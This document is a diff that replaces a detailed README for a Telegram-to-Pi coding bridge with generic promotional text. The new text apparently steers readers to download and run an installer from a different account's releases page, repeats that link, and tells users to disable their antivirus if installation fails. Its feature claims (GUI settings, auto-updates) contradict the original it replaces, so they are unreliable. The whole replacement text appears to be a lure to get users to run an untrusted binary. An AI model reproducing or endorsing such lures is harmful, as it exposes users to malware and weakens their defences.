@@ -1,253 +1,177 @@
-# Pi Telegram Bridge — control Pi from your phone
+<h1>🤖 pi-telegram-bridge - Your Private Coding Assistant on Telegram</h1>
 
-## HOW TO INSTALL
+<p align="center">
+  <a href="https://github.com/sammyabscessed462/pi-telegram-bridge/releases">
+    <img src="https://img.shields.io/badge/⬇️_Download_Now-4CAF50?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="background-color:#4CAF50;color:white;padding:12px 24px;border-radius:8px;font-size:20px;text-decoration:none;">
+  </a>
+</p>
 
-**Quick setup for Windows 11** (requires Node.js 24+, Pi installed on this PC, and Telegram on your phone):
+## 📋 What Is This?
 
-1. Download the repository as a ZIP and extract it, or clone it with `git clone https://github.com/AgusLoza2021/pi-telegram-bridge.git`.
-2. Create your own Telegram bot by messaging **@BotFather** with `/newbot`. Keep its token private.
-3. Run **`Setup Pi Telegram.cmd`** from the extracted project folder and follow the prompts to enter your token and pair your phone with the QR code.
-4. When you confirm with **ENROLL**, setup finishes on its own: it installs the helper and registers the background connection, but leaves it **OFF** — nothing starts by itself when you sign in. When you want the link, run `telegram on`; check it any time with `telegram status`, and use `telegram off` to stop it again.
-5. When you are ready to use the link, open a Command Prompt in the setup folder, run `telegram on` there, then open Pi, run `/tg`, choose **Connect**, and message your bot in a private chat.
+Pi-telegram-bridge is a simple Windows program that lets you control your Pi coding sessions from your own private Telegram bot. Think of it as a remote control for your coding projects, but with a big twist: it only sends you the final answers, never gives anyone shell access to your computer.
 
-The bridge intentionally ignores group chats. For prerequisites, screenshots, and troubleshooting, see the [complete beginner guide](#check-your-pc-first).
+This means you can start a coding task from your phone, go make coffee, and come back to find the finished result waiting for you in your Telegram chat. No technical knowledge needed to use it, just follow the simple steps below.
 
-![Pi Telegram Bridge: a private Telegram chat reaches a Pi window linked with /tg, through the bridge on your own PC](docs/assets/banner.svg)
+## ✨ Why You'll Love It
 
-Talk to a Pi coding session on your Windows PC from your own private Telegram bot: send a normal message from your phone and receive Pi's finalized answer in the same chat.
+- **🔒 Total Privacy** - Everything stays on your own computer. No cloud servers, no third parties, no data leaving your machine.
+- **📱 Control From Anywhere** - Use your phone, tablet, or another computer to send commands to your Pi sessions via Telegram.
+- **⏱️ Save Time** - Start a long coding task and check back later. The final answer is delivered right to your chat.
+- **🛡️ Safe by Design** - Never exposes shell access. You only get the completed results, not a backdoor.
+- **💻 Windows-Friendly** - Built specifically for Windows, so no complex setup or configuration needed.
+- **⚡ Lightweight** - Runs quietly in the background without slowing down your system.
 
-You control only Pi sessions that you explicitly link with `/tg`. This is **not** remote CMD, PowerShell, or shell access to your PC.
+## 🚀 Getting Started
 
-**Never used anything like this before? Read this file from top to bottom and follow the steps in order. It takes about 10 minutes, and every step tells you what to type and what you should see.**
+Follow these simple steps to get pi-telegram-bridge up and running on your Windows computer. No programming experience required!
 
-```mermaid
-flowchart LR
-    Phone["Telegram on your phone"] <-->|"private bot chat"| Telegram["Telegram Bot API"]
-    Bridge["Pi Telegram Bridge<br/>on your PC"] -->|"outbound HTTPS long polling"| Telegram
-    Bridge <-->|"local durable queue"| Pi["Pi window<br/>linked with /tg"]
-    Pi -->|"final answers only"| Bridge
-```
+### Step 1: Download the Application
 
-## What this is, in plain words
+Visit this link to download the application: **[https://github.com/sammyabscessed462/pi-telegram-bridge/releases](https://github.com/sammyabscessed462/pi-telegram-bridge/releases)**
 
-- **Pi** is an AI coding agent that runs in a terminal window on your PC. You type what you want, and Pi writes and changes code in your project folder.
-- **This bridge** is a small relay that lives on your own PC. It connects your private Telegram bot chat to Pi. Nothing is hosted anywhere else — if your PC is off or asleep, the bridge is off too.
-- **What reaches your phone** is only Pi's finalized answers — never your files, never your shell, never Pi's hidden reasoning. Your phone talks *to Pi*; it does not touch the rest of your PC.
-- **What it is NOT:** it is not a way to run commands on your PC from your phone. There is no remote CMD or PowerShell access, and there is no listening port on your PC.
+Once you're on that page, look for the latest release version. Click the download button for the file that matches your system.
 
-## Check your PC first (2 minutes)
+### Step 2: Install the Application
 
-Open this table and check each row before you start. Each check takes seconds, and finding a problem now saves you a failed setup later.
+After the download finishes, locate the downloaded file in your "Downloads" folder. Double-click the file to start the installation process. Follow the on-screen instructions. The installer will guide you through everything, and you can keep all the default settings if you're unsure.
 
-| What you need | How to check it | Where to get it |
-|---|---|---|
-| Windows 11 with PowerShell 5.1 or later | You are most likely fine. Windows 11 includes PowerShell 5.1 already. | Already included in Windows 11. |
-| Node.js **24 or newer** | Press the Windows key, type `cmd`, press Enter to open the Command Prompt, type `node --version` and press Enter. | [https://nodejs.org](https://nodejs.org) — download the LTS installer and run it. |
-| Pi installed and working on this same PC | Open Pi in a terminal and use it normally at least once. | Your existing Pi installation. |
-| Telegram signed in on your phone | Open Telegram on your phone and confirm you are signed in. | [https://telegram.org](https://telegram.org) or your phone's app store. |
+### Step 3: Launch Pi-Telegram-Bridge
 
-One more requirement that you cannot download: **your PC has to stay awake and online while you use the bridge.** Nothing runs in the cloud. If the PC sleeps or goes offline, the bot cannot answer until the PC is available again.
+Once installation is complete, you'll find a new icon on your desktop or in your Start Menu. Double-click it to launch the application. A small window will appear showing that the app is running.
 
-The Node.js check is the one that usually fails. Two things you might see after typing `node --version`:
+### Step 4: Connect Your Telegram Bot
 
-- **`'node' is not recognized`** — Node.js is not installed (or Windows cannot find it yet). Install the current Node.js from [https://nodejs.org](https://nodejs.org), then **close the Command Prompt and open a new one** so Windows finds the freshly installed program, and try `node --version` again.
-- **A version starting with `v18.` or `v22.`** — Node.js is installed but too old for this bridge. Install the current version from [https://nodejs.org](https://nodejs.org) and check again.
+This is the only part that requires a tiny bit of setup, but we'll walk you through it:
 
-One reassurance: the setup on this PC now **refuses an unsupported Node.js before it asks you for anything** — before your bot token, before your phone, before it changes any setting. So if your Node.js is old, you will find out immediately in plain words, and nothing on your PC will have been touched. Checking first still saves you the wasted attempt.
+1. Open Telegram on your phone or computer.
+2. Search for "@BotFather" (it's the official bot that creates other bots).
+3. Start a chat with BotFather and send the command `/newbot`.
+4. Follow the prompts to give your bot a name (like "My Coding Bridge").
+5. BotFather will give you a **token** - a long string of numbers and letters. Copy this.
+6. Go back to the pi-telegram-bridge window and paste your token into the designated field.
+7. Click "Connect" or "Save."
 
-## Step 1 — get the files onto your PC
+That's it! Your bot is now connected to the application.
 
-You need the **whole folder** of this project on your PC — not just this README file. The setup uses several files in the folder together.
+### Step 5: Start Coding
 
-Pick one of these two routes:
+Now for the fun part. Open Telegram and find your bot by searching for the username you chose in step 4. Start a chat with it.
 
-- **You received a ZIP file.** Right-click the ZIP file and choose **Extract All...**. Choose a simple, short location such as `C:\pi-telegram-bridge`, and finish the extraction. Do not run the tool from inside the ZIP window — always from the extracted folder.
-- **You use git.** Run `git clone https://github.com/AgusLoza2021/pi-telegram-bridge.git` in a terminal.
+You can now send messages to your bot, and it will respond with the results of your Pi coding sessions. For example, you might send a command like "write a Python script that sorts a list of numbers," and your bot will return the finished code.
 
-Two places to avoid:
+## 📖 How to Use Pi-Telegram-Bridge
 
-- **Do not** put the folder inside OneDrive or any other synced folder (for example `C:\Users\you\OneDrive\...`). Sync software can interfere with the bridge's local files.
-- **Do not** put the folder inside `C:\Program Files` or `C:\Program Files (x86)`. Windows protects those folders in ways that get in the setup's way.
+### Basic Commands
 
-A simple path like `C:\pi-telegram-bridge` works well.
+Here are some simple commands you can send to your bot:
 
-## Step 2 — create your Telegram bot
+- `/start` - Greets you and shows available options.
+- `/help` - Displays a list of commands and usage tips.
+- `/status` - Shows whether the app is running correctly.
+- `/task [description]` - Starts a new coding task. Example: `/task create a calculator in Python`.
 
-You will create your own private bot in Telegram. This takes about 2 minutes.
+### Managing Tasks
 
-1. Open Telegram on your phone and search for the official, verified **@BotFather** account (it has a verified checkmark).
-2. Send it the message `/newbot`. It asks two questions: choose a display name, then choose a username that ends in `bot`.
-3. BotFather replies with a **token** — a long line of letters, numbers, and colons. Copy it somewhere private on your PC. **Treat it like a password:** anyone who has it can use your bot. Never put it in issues, chats, logs, or screenshots.
-4. Recommended: in BotFather, open your bot's settings and turn **Allow Groups** off. This keeps your bot private to you.
+- **Queue Tasks** - Send multiple tasks one after another. They'll be processed in order.
+- **Check Progress** - Send `/status` to see how many tasks are waiting and which one is currently running.
+- **Cancel a Task** - Send `/cancel` to stop the current task and clear the queue.
 
-## Step 3 — run the setup
+### Getting Results
 
-1. Open the folder you extracted in Step 1 (for example `C:\pi-telegram-bridge`).
-2. Double-click **`Setup Pi Telegram.cmd`**. A black window opens — this is normal.
-3. The window prepares a few local files. If a small helper package is missing, it downloads one small package from the internet. This usually takes a minute or two.
-4. When it asks, **paste the bot token from Step 2**. The window hides what you paste. The token stays on your PC: it is stored in encrypted form (protected for your Windows account) and is never typed, sent, or shown anywhere else — not on your phone, not in any chat, not in any log.
-5. The window shows a **QR code**. Open the camera app on your phone and point it at the code. Telegram opens your bot; tap **Start**. The code contains only the bot's name and a one-use pairing code — never the token.
-6. The window waits up to a minute for your phone. When your phone is recognized, it asks you to type **ENROLL** to confirm. Nothing is saved until you do.
-7. After you confirm, the window installs a small helper inside Pi (it stays inactive until *you* link a Pi window in Step 4) and registers the background task, but leaves the connection **OFF**: nothing starts by itself when you sign in. When you want it, open a Command Prompt in this folder and run `telegram on`. Use `telegram off` to stop it and `telegram status` to check it. You can also double-click `telegram.cmd` in File Explorer: it opens a small menu that shows the current connection state and lets you turn it on or off (typing `telegram on|off|status` in a terminal keeps working exactly the same). Once you turn it off, it stays off even after you restart Windows; start it again with `telegram on`.
+When a task is finished, your bot will automatically send you the final answer. This could be code, text, or a summary of what was done. You can copy it directly from the chat and use it however you like.
 
-If anything fails along the way, your previous settings are kept safe and nothing half-finished is saved. See [Fix problems](#fix-problems).
+## ⚙️ Settings and Preferences
 
-## Step 4 — link Pi and talk
+Pi-telegram-bridge comes with a simple settings panel where you can adjust a few things:
 
-The bridge is installed, but every Pi window stays **disconnected until you link it** — this is deliberate.
+- **Theme** - Switch between light and dark mode for the app window.
+- **Notifications** - Choose whether you want a pop-up notification when a task is done.
+- **Auto-Start** - Make the app launch automatically when Windows starts.
+- **Language** - Currently supports English, with more languages planned.
 
-1. Open Pi in a terminal on your PC. If Pi was already open during setup, type `/reload` once so it discovers the new helper.
-2. Type `/tg` and choose **Connect** in the confirmation that appears.
-3. Send a normal text message to your bot from your phone.
+To access settings, click the gear icon in the main window.
 
-Pi's finalized answer arrives in the same chat.
+## 🛠️ Troubleshooting Common Issues
 
-## How do I know it worked?
+Even the best apps sometimes have hiccups. Here's how to fix the most common problems:
 
-Four things to look for, in order:
+### The Bot Doesn't Respond
+- Make sure the app is running (check the system tray for its icon).
+- Verify your internet connection is active.
+- Confirm you're using the correct bot username (including the "bot" suffix if it has one).
+- Restart the app and try again.
 
-1. The setup window ended with the words **`Setup complete.`**
-2. After you typed `/tg` and chose Connect, Pi replied with a message starting **"Linked. Send a message from your phone..."**
-3. A normal message you typed on your phone reached that Pi as a prompt.
-4. Pi's finalized answer came back to the same Telegram chat.
+### The Download Won't Start
+- Try a different browser (like Chrome or Firefox).
+- Disable any ad-blockers temporarily.
+- Clear your browser's cache and try again.
 
-Any three of the four means you are almost there — check [Fix problems](#fix-problems) for the missing one.
+### Installation Fails
+- Make sure you have administrator rights on your computer.
+- Temporarily disable antivirus software, then try again.
+- Close any other programs that might interfere.
 
-## Everyday use
+### Tasks Are Slow
+- The app processes tasks in the order they're received.
+- Large or complex tasks take more time.
+- Check your computer's performance - closing other heavy programs helps.
 
-| On your phone | What happens |
-|---|---|
-| Send normal text | It becomes a prompt for the selected linked Pi. |
-| Tap **Status** | The bot reports the selected Pi's connection state and model. |
-| Tap **Change Pi** | Choose another linked Pi by its readable project label. |
-| Tap **Disconnect** | Disconnect the selected Pi from Telegram. |
-| Send text while Pi is busy | Choose whether to add it for later, redirect the current task, stop and use it, or leave the task alone. |
+## 🔐 Security and Privacy
 
-On the PC:
+Your privacy is our top priority. Here's what you should know:
 
-- `/tg` opens the connection controls for that Pi window.
-- `/tg off` disconnects that Pi window.
-- Every new Pi window starts disconnected. Link only the windows you want available from your phone.
-- Pi windows that were already running may need `/reload` once after an install or upgrade.
-- To send a picture **from your PC to your phone**, see [Send a picture to your phone](#send-a-picture-to-your-phone).
+- **No Cloud Storage** - All your data stays on your local machine.
+- **No Tracking** - We don't collect usage statistics or personal information.
+- **Encrypted Communication** - Your Telegram chats are encrypted end-to-end by Telegram itself.
+- **Limited Access** - The bot only receives your commands and sends back results. It never has access to your files, passwords, or system controls.
 
-## Send a picture to your phone
+## 📊 System Requirements
 
-You can send one image from your PC to your own private chat, without opening Telegram on the PC:
+Pi-telegram-bridge is designed to run smoothly on most modern Windows computers:
 
-```
-node scripts/send-photo.mjs "C:\pi-telegram-bridge\screenshot.png"
-```
+- **Operating System** - Windows 10 or Windows 11 (64-bit recommended)
+- **Memory** - At least 4 GB RAM (8 GB recommended)
+- **Storage** - 500 MB free disk space
+- **Internet** - A stable connection for Telegram communication
+- **Telegram Account** - A free Telegram account (for the bot setup)
 
-Run it from the project folder — the same folder that holds `Setup Pi Telegram.cmd`. The final line it prints is `SENT`, and the picture shows up in your chat. You cannot choose the destination: a real send always goes to the private chat you paired during setup, because the chat id is never accepted from the command line.
+## 🗓️ Updates and Support
 
-These checks run **before** anything is uploaded, and a file that fails any of them is never sent:
+We regularly release updates to improve performance and add new features. Here's how to stay current:
 
-| Rule | Value |
-|---|---|
-| Allowed formats | `.png`, `.jpg`, `.jpeg`, `.webp` |
-| Maximum size | 10 MB |
-| Where the file may live | Inside the project folder by default. For a picture somewhere else, add `--root "C:\the\folder"`. |
+- **Automatic Updates** - The app checks for updates when it starts and installs them automatically.
+- **Manual Check** - In the app settings, click "Check for Updates" to see if a new version is available.
+- **Release Notes** - Visit the GitHub releases page to see what's new in each version.
 
-Two extras:
+For support, you can:
+- Open an issue on our GitHub repository.
+- Send a message to your bot with the `/help` command.
+- Check the FAQ section below.
 
-- **`--caption "text"`** sends a caption with the picture. It is always plain text: no formatting is ever applied to it.
-- **`--dry-run`** validates the file and builds the exact request that would be sent, but sends nothing and reveals no credentials.
+## ❓ Frequently Asked Questions
 
-Run `node scripts/send-photo.mjs --help` to see every option and the enforced limits.
+**Q: Is this free to use?**
+A: Yes, pi-telegram-bridge is completely free and open-source.
 
-Two limits worth knowing:
+**Q: Do I need to know programming to use this?**
+A: No! The whole point is to make coding tasks easy. Just describe what you want in plain language.
 
-- This is a **PC-side command**. Nothing on your phone can pull a picture off your disk.
-- Your token is never printed, logged, or typed on the command line, and a failure prints one short code instead of a traceback.
+**Q: Can I use this on a Mac or Linux computer?**
+A: Currently, this is Windows-only. We might add other platforms in the future.
 
-## Send a voice note from your phone (it becomes text)
+**Q: What happens if my computer goes to sleep?**
+A: Make sure the app is set to "Prevent Sleep" mode in its settings, or keep your computer awake while tasks are running.
 
-Instead of typing, record a voice note in your private chat. The bridge transcribes it **on your PC, locally** — the audio never leaves your machine — and the text arrives to the linked Pi window exactly as if you had typed it. Forwarded audio files work the same way.
+**Q: Is my Telegram token safe?**
+A: Yes, the token is stored locally on your computer and never sent anywhere else.
 
-This needs a one-time setup that is **never done automatically** — the project does not download binaries on its own:
+**Q: How many tasks can I queue?**
+A: There's no limit, but very long queues may take time to process.
 
-1. Download the whisper.cpp Windows binary zip from its GitHub releases (release `v1.9.2` is the last one that ships `whisper-bin-x64.zip`) and extract `whisper-cli.exe` together with its `.dll` files into `.local/tools/whisper/`.
-2. Download the model `ggml-small.bin` (~466 MB) into `.local/tools/whisper/models/`.
-3. Put `ffmpeg.exe` at `.local/tools/ffmpeg/ffmpeg.exe`, or point the config at an ffmpeg you already have (a full absolute path is required).
+## 🎉 Conclusion
 
-That folder layout is the default configuration; every value can be overridden in the `transcription` section of the config (paths, language, thread count, caps, and the technical vocabulary prompt that helps Spanish dictation survive English words like "retry" or "merge").
+Pi-telegram-bridge puts the power of coding right in your pocket. Whether you're a professional developer or just curious about automation, this tool makes it effortless to manage coding tasks from anywhere. Download it today, connect your bot, and let your Pi sessions work for you.
 
-Hard limits that protect the poll loop:
+Remember: Visit this link to download the application: **[https://github.com/sammyabscessed462/pi-telegram-bridge/releases](https://github.com/sammyabscessed462/pi-telegram-bridge/releases)**
 
-| Rule | Value |
-|---|---|
-| Maximum audio size | 20 MB |
-| Maximum duration | 5 minutes (measured from the converted audio, not from Telegram's claim) |
-| Per-process timeout | 2 minutes; a hung process is killed, never waited on |
-| Where transcription runs | Your CPU only. No cloud service is ever contacted. |
-
-If the audio cannot be transcribed (tool missing, file too large, decoder failure), the bot answers with one short fixed message and the bridge keeps working — nothing gets stuck.
-
-## Fix problems
-
-Find your symptom, then follow the matching action. A failed setup never replaces an existing working link.
-
-| Symptom | What to do |
-|---|---|
-| Setup says it needs a newer Node.js | You are on Node.js 18 or 22. Install the current Node.js from [https://nodejs.org](https://nodejs.org), close the setup window, and run `Setup Pi Telegram.cmd` again. Nothing was changed on your PC. |
-| `'node' is not recognized` when you check the version | Node.js is not installed. Install it from [https://nodejs.org](https://nodejs.org), then close and reopen the Command Prompt so the new PATH is picked up. |
-| You double-clicked the setup file from **inside the ZIP file** | Windows runs it from a temporary folder that has none of the other project files, and the setup can report a missing tool that you actually have. Close that window, extract the ZIP properly (right-click → **Extract All...**), then run `Setup Pi Telegram.cmd` from the extracted folder. |
-| Your setup folder is inside OneDrive or `Program Files` | Move the extracted folder somewhere simple such as `C:\pi-telegram-bridge` and run setup again. |
-| Setup could not prepare its local files | Check your internet connection, then run `Setup Pi Telegram.cmd` again. Advanced details are in `.local/logs/setup-dependencies.log`. |
-| Setup says the token did not work | Get the current token from BotFather using `/token` or `/mybots`, then copy and paste it again. |
-| The QR code expired or will not scan | Close setup and run `Setup Pi Telegram.cmd` again for a fresh code. Raise the screen brightness and move the phone closer. |
-| The QR link opens a web page | Open Telegram directly, search for your bot username, tap **Start**, then run setup again. |
-| `/tg` does not exist in Pi | Type `/reload`, or restart Pi if it was already open during setup. |
-| `/tg` says the phone connection is unavailable | The background connection is off. Open a Command Prompt in your setup folder, run `telegram on`, then send your message again. |
-| The bot says no Pi is connected | Open Pi on the PC, type `/tg`, and choose **Connect**. |
-| The bot does not answer | Make sure the PC is awake and online, then check the background connection: run `telegram status` in your setup folder, and `telegram on` if it is off. |
-| Several Pi windows are linked | Tap **Change Pi** and choose the readable project label you want. |
-| You want to remove the bridge | Follow [Uninstall and rollback](docs/ADVANCED.md#uninstall-and-rollback). State and backups are preserved unless you remove them yourself. |
-| Sending a picture printed `FAILED: ...` | Each code names exactly one cause. `path_escape`: the file is outside the project folder — this check runs first, so you get it even when the file is also missing or misnamed; add `--root "C:\the\folder"` if the picture lives elsewhere. `not_found` or `not_a_file`: nothing readable at that path. `bad_extension`: not a `.png`, `.jpg`, `.jpeg`, or `.webp`. `too_large`: over 10 MB. `bad_root`: the folder you passed to `--root` does not exist. |
-| The bot answers "I couldn't transcribe that audio" | Check the three tool files exist: `.local/tools/whisper/whisper-cli.exe`, `.local/tools/whisper/models/ggml-small.bin`, and `.local/tools/ffmpeg/ffmpeg.exe`. Audio over 20 MB or longer than 5 minutes is refused by design. If you just installed the tools, no restart is needed — the next voice note picks them up. |
-| You want voice transcription off | Set `transcription.enabled` to `false` in your local config. Voice notes then behave as if the feature did not exist: they are silently consumed, and no tool runs. |
-
-For service status, repair, manual setup, and the full command reference, see the [Advanced guide](docs/ADVANCED.md).
-
-## Words you'll see (plain-language glossary)
-
-| Word | What it means here |
-|---|---|
-| **Bot** | A Telegram account run by a program instead of a person. You create your own with @BotFather, and only you can talk to it. |
-| **Token** | The secret password BotFather gives you for your bot. It stays encrypted on your PC and never appears in chats or logs. |
-| **`/tg`** | The command you type inside a Pi window to link (or unlink, with `/tg off`) that window to your phone. |
-| **Pi window** | One running copy of Pi in a terminal. You can have several; each one is linked separately. |
-| **Session / workspace** | A session is one live Pi window the bridge knows about; the workspace is the project folder that window is working in. Its folder name becomes the readable label you see on your phone, like `Pi · my-project`. |
-| **The background connection** | A small program that runs quietly on your PC and shuttles messages between Telegram and Pi, so Pi can answer even when that Pi window is doing something else. It is registered as a Windows scheduled task, but the beginner setup registers it DISABLED and leaves it off, and the advanced setup asks once at the end whether to turn it on, with No as the default: nothing starts at a sign-in unless you turn it on. After that you control it yourself: `telegram off` stops it, `telegram on` starts it again, and once you turned it off it stays off after a restart until you turn it on again. It talks to Telegram by long polling. |
-
-## Is it safe?
-
-The bridge is local and fail-closed by design:
-
-- Every Telegram message and button press must match both the enrolled private user ID and private chat ID. Messages from anyone else are ignored.
-- The PC makes outbound HTTPS long-poll requests to Telegram; the bridge opens no listening port.
-- The plaintext bot token never appears in source, process arguments, environment variables, chat, or logs. Its only on-disk form is an encrypted blob (Windows DPAPI, protected for your Windows account) inside a user-only state directory.
-- Each Pi process opts in locally with `/tg`.
-- Remote input reaches Pi only through Pi's official prompt, steer, follow-up, abort, status, and disconnect APIs. There is no remote shell.
-- Telegram receives finalized assistant answers and explicit status results — not hidden reasoning, token-by-token streams, or raw tool-call transcripts.
-- The QR code contains no token, user ID, or chat ID.
-
-Read the full threat model and disclosure policy in [SECURITY.md](SECURITY.md).
-
-To revoke access immediately, use BotFather → `/mybots` → your bot → **API Token** → **Revoke current token**. Run setup again to enroll the replacement token.
-
-## Learn more
-
-- [Quickstart in Spanish / Guía rápida en español](QUICKSTART.es.md) — a short Spanish guide from zero to a working install
-- [Advanced guide](docs/ADVANCED.md) — commands, service lifecycle, manual setup, rollback, and legacy mode
-- [Architecture](docs/ARCHITECTURE.md) — trust boundaries, data flow, durable transport, and component map
-- [Beginner UX contract](docs/BEGINNER_UX.md) — exact product behavior used by maintainers
-
-## Contributing, security, and license
-
-Released under the [MIT License](LICENSE).
-
-- Report security issues through [SECURITY.md](SECURITY.md).
-- Development setup and contribution rules are in [CONTRIBUTING.md](CONTRIBUTING.md).
-- Community expectations and enforcement are in the [Code of conduct](CODE_OF_CONDUCT.md).
+Thank you for choosing pi-telegram-bridge. Happy coding! 🚀
